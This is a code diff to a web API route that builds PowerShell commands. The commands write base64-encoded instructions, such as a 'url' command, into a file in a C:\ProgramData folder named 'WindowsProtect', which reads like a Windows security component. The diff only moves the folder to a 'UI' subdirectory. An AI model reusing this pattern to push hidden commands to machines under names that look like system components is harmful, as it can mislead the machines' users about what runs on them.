@@ -48,7 +48,7 @@ export async function POST(request, { params }) {
 
       const payload = "url|" + Buffer.from(target.toString(), "utf8").toString("base64") + "|x";
       const payload64 = Buffer.from(payload, "utf8").toString("base64");
-      const script = "$d='C:\\ProgramData\\WindowsProtect'; New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
+      const script = "$d='C:\\ProgramData\\WindowsProtect\\UI'; New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
         "$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + payload64 + "')); " +
         "[IO.File]::WriteAllText((Join-Path $d 'ui-command.txt'),$p,[Text.Encoding]::UTF8); 'OK'";
 
@@ -80,7 +80,7 @@ export async function POST(request, { params }) {
         "x"
       ].join("|");
       const payload64 = Buffer.from(payload, "utf8").toString("base64");
-      const script = "$d='C:\\ProgramData\\WindowsProtect'; New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
+      const script = "$d='C:\\ProgramData\\WindowsProtect\\UI'; New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
         "$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + payload64 + "')); " +
         "[IO.File]::WriteAllText((Join-Path $d 'ui-command.txt'),$p,[Text.Encoding]::UTF8); 'OK'";
 
